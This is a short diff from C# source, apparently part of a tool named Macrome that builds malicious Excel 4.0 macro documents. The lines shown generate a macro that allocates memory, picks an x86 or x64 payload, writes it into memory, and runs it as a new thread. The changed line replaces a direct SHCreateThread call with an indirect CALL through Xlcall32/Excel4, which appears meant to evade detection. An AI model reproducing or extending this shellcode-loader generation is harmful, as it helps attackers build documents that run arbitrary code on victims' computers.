@@ -448,7 +448,7 @@ namespace Macrome
                 "targetAddress=AllocateMemory()",
                 string.Format("=IF(ISNUMBER(SEARCH(\"32\",GET.WORKSPACE(1))),SET.NAME(\"payload\",{0}),SET.NAME(\"payload\",{1}))", x86Payload, x64Payload),
                 "bytesWritten=WriteLoop(targetAddress,payload,\"\")",
-                "=shCreateThread(targetAddress,\"\",0,0)",
+                "=CALL(\"Xlcall32\",\"Excel4\",\"2JRJRRRRRRR#\",150,,7,\"shlwapi\",\"SHCreateThread\",\"JJCJJ\",targetAddress,\"\",0,0)",
                 "=HALT()"
             };
             
